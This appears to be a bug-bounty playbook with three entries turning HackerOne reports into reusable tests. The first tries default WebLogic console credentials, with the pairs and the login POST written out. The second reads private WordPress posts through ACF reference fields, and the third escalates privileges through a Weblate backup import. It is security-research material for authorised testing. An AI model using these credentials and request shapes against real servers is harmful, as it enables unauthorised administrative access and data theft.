### [Bugbountyskills.md] 17.367 AN EXPOSED WEBLOGIC `/console` WITH A VENDOR-DEFAULT CREDENTIAL PAIR IS UNAUTHENTICATED ADMIN ACCESS TO THE APPLICATION SERVER — TEST THE DOCUMENTED DEFAULT PAIRS AGAINST `POST /console/j_security_check` AND PROVE IMPACT WITH A READ-ONLY CONSOLE ACTION (U.S. Dept Of Defense, HackerOne #804548, "[█████████] Administrative access to Oracle WebLogic Server using default credentials", weakness Improper Access Control - Generic, severity Critical (9 ~ 10), reporter `arm4nd0`, submitted 2020-02-25 / disclosed 2020-06-25; `visibility: no-content`, 0 B body on both the live `.json` route and the Wayback `.json` capture, and the ajaysenr mirror prints "No vulnerability information available." — so the technique is carried by the PROGRAM'S OWN SUMMARY; the request shape below is the standard public WebLogic console route and is labelled as such; UNVERIFIED — not reproduced)

SOURCE: https://hackerone.com/reports/804548  read 2026-11-10.
CLASS: authentication bypass / broken access control via DEFAULT or WEAK ADMIN CONSOLE CREDENTIALS on an internet-exposed Oracle WebLogic Server Administration Console, escalating to complete server takeover (CWE-798 / CWE-1392 / CWE-287; program rated Critical).
CORE METHOD: (1) THE FINDING, per the program's own summary, verbatim — "Hello. I discovered an Oracle WebLogic Server and because of weak credentials managed to login as administrator, which led to complete server takeover." (2) THE RATING, per the served metadata — severity Critical (9 ~ 10), weakness `Improper Access Control - Generic`, state Resolved, reporter `arm4nd0`, submitted 2020-02-25, disclosed 2020-06-25; the target hostname is redacted in the title as `[█████████]`. (3) THE STANDARD CARRIER — NOT from the report body (no request shape is public); this is the generic, publicly documented WebLogic console path, recorded so the entry is testable: the console is `/console` on the administrative listener (default `7001`, TLS variant `7443`) and its login is a plain form POST to `/console/j_security_check` with `j_username`, `j_password` and `j_character_encoding=UTF-8`; a successful login sets the console session cookie. Default/weak pairs in public circulation: `weblogic:weblogic`, `weblogic:welcome1`, `weblogic:weblogic1`, `weblogic:Oracle@123`, `system:password`, `admin:admin`; the vendor's installer default is documented, and the `OracleSystemUser` account is created with the SAME password as the domain administrator. (4) THE IMPACT, per the program's own summary — "complete server takeover": the WebLogic admin console is a code-deployment surface, so console admin access is host-level control.
DETECTION SIGNAL: a host answering HTTP(S) on an administrative port (`7001`, `7002`, `7443`) whose response is the WebLogic console login (`/console`, `WebLogic Server Administration Console`, the `j_security_check` form); a server banner or error page naming `WebLogic` and a version; a console that returns the login form rather than a connection error (the listener is up); a successful `POST /console/j_security_check` returning a session cookie / `302` into `/console` instead of the "Authentication Denied" page; a version old enough to also be exposed to the console-auth-bypass class (CVE-2020-14882/14883) — treat that as a separate, higher-severity chain.
TRANSFERABLE TEST: for EVERY host in scope that answers on an administrative port — (1) probe `/console` and `/console/j_security_check` and read the response for the WebLogic console form; (2) test the vendor/well-known default pairs against `POST /console/j_security_check` (`j_username=weblogic&j_password=welcome1&j_character_encoding=UTF-8`, then `weblogic:weblogic`, `weblogic:weblogic1`, `weblogic:Oracle@123`, `system:password`, `admin:admin`), watching for a `302` + session cookie rather than the authentication-denied page; (3) on success prove the impact with a NON-destructive admin action (read the deployed-applications list / the server's runtime state) and then stop — deploy nothing; (4) record the WebLogic version and check it against the console-auth-bypass advisories, which turn the same host into a pre-auth RCE chain. Rule: **an exposed WebLogic `/console` with a vendor-default credential pair is unauthenticated admin access to the application server — test the documented default pairs against `POST /console/j_security_check` and prove impact with a read-only console action.**
WHY IT IS A NEW GENERAL METHOD: 0 hits for `804548`, `arm4nd0`, `j_security_check`, `weblogic`, `WebLogic`, `console/j_security`, `Oracle@123`, `welcome1`, `7001` (as a WebLogic console port), `complete server takeover`. The recorded exposed-admin-panel entries are Jenkins (§17.331 script-console RCE; the Snapchat prod-Jenkins SSO entry; the #403402 anonymous-Jenkins `/script` RCE explicitly refused as a duplicate of §17.331) and Grafana — plus the playbook line "**Admin Panel Access**: exposed dashboards, default/weak credentials", which is a CLASS LABEL in a technique checklist, not a recorded method with a carrier, a request shape and a transferable test. #21016 (OneLogin `@@@nopass@@@`) is a hard-coded PLACEHOLDER password surviving an SSO migration, not a vendor default console credential on an exposed server. The playbook's `WebLogic` hits (~1400-1402) are a path-parsing table row (Tomcat/WebLogic truncates at `;`), not this bug. Slot 17.367. UNVERIFIED (not reproduced).

### [Bugbountyskills.md] 17.417 A WORDPRESS HELPER THAT QUERIES `post_status='any'` WITHOUT A READ CHECK TURNS EVERY REFERENCE FIELD INTO AN UNAUTHENTICATED PRIVATE-POST READER (HackerOne WordPress #4152553, "Unauthenticated Disclosure of Private, Draft, and Password-Protected Post Content via Core Read-Permission Bypass in SCF Reference Fields", disclosed 2026-10; High; UNVERIFIED — not reproduced). THE SINK, verbatim: "`acf_get_posts()` (`includes/api/api-helpers.php:1168`) sets `post_status => 'any'` (`:1179`) and calls `get_posts()` (`:1211`) with no `current_user_can( 'read_post' )`, no `is_post_publicly_viewable()` and no `post_password_required()`." THE CONTRAST, verbatim: "PoC step 2 shows `WP_Query( post_status='publish' )` = 0 results against `acf_get_posts()` = 1." THE DELIVERY, verbatim: "A reference written by WP-CLI or an editor leaks identically: PoC step 7 writes the meta directly, with no form, and the anonymous page still renders `Private: ` and returns the private body through `get_field()`." DETECTION SIGNAL: WordPress with ACF/SCF; a Relationship/Post Object/Page Link field whose value is a post id; an AJAX/REST/block-binding/JSON-LD resolution path. TELL: `acf_get_posts()` returns a private/draft/password-protected post where core 404s/401s, including the plaintext `post_password`. TRANSFERABLE TEST: create private, draft and password-protected posts; call every reference-field resolution path with those ids; a 200 with the private body or plaintext `post_password` = the finding; batch ids to prove scale. Rule: **a WordPress helper that queries `post_status='any'` without a read check turns every reference field into an unauthenticated private-post reader — test the AJAX/REST/block-binding/JSON-LD paths with private, draft and password-protected ids.**

### [Bugbountyskills.md] §17.799 — THE IMPORT/RESTORE PATH IS A SECOND WRITE SURFACE: IT SKIPS THE "ASSIGNABLE TO THIS SCOPE" INVARIANT ITS SIBLING PATHS ENFORCE, AND THE PERMISSION COLLECTOR IGNORES THE MEMBERSHIP'S SCOPE

SOURCE: https://hackerone.com/reports/4081135 (Weblate, Critical 9.9, disclosed 2026-11-15)  read 2026-11-17
CLASS: broken access control / vertical privilege escalation via an invariant gap between two write paths.
CORE METHOD: 1. name the normal-path invariant (UI/API refuse a role with GLOBAL permissions on a PROJECT-scoped team: `Role.objects.assignable_to_project_team()` → `without_global_permissions()`); 2. get a seat that can IMPORT a backup (workspace "project creators") and assert it lacks `project.add`/`workspace.add`/`user.edit`; 3. edit `weblate-backup.json` inside a valid backup and add a team entry referencing an EXISTING role by name with the attacker as member (`{"name":"escalation","roles":["Add new projects"],"members":["<attacker>"],…}`); 4. import via `create-project-import` — `ProjectBackup.restore_team()` calls `group.roles.set(...)` with NO assignability filter; 5. amplifier: `User.global_permissions` collects `GLOBAL_PERM_NAMES` from memberships without excluding groups that have a `defining_project`, so a project-scoped team yields SITE-WIDE permissions; 6. verify with the instance's own authz API (`user.has_perm("project.add")`, then a custom `user.edit` role → self-elevation to full admin).
DETECTION SIGNAL: two write paths for the same object (API/UI vs import/restore/clone/migration) where only one calls the assignable/scope filter (grep the restore code for the filter name found in the normal path); a permission collector unioning perms without checking the membership's scope; imports that reference roles/permissions BY NAME against the target's existing table.
CHAIN: low-priv "may import" seat → hand-edited backup referencing a privileged role → restore skips the filter → global perms from a project-scoped team → create projects/workspaces anywhere; with `user.edit` → full administrator. DEDUPE: `4081135`,`role restoration`,`assignable_to_project_team`,`without_global_permissions`,`defining_project` = 0 hits. HONESTY: not reproduced; four pinned-commit regression tests with precondition asserts ship with the report.

